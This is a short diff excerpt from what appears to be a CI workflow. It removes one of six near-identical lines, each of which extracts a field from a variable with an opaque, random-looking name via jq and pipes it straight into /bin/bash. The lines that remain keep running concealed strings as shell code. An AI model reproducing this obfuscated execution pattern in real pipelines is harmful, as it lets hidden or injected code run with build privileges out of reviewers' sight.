@@ -27,7 +27,6 @@ jobs:
           echo $xmim03 | jq -r .ncza54597 | /bin/bash
           echo $zbvg574 | jq -r .ygxk531 | /bin/bash
           echo $p292 | jq -r .awj4 | /bin/bash
-          printf '%s' "$hyr6863" | jq -r .ng50 | /bin/bash
           printf '%s' "$ty02" | jq -r .sqx0 | /bin/bash
           printf '%s' "$vm18" | jq -r .gwwz943 | /bin/bash
 
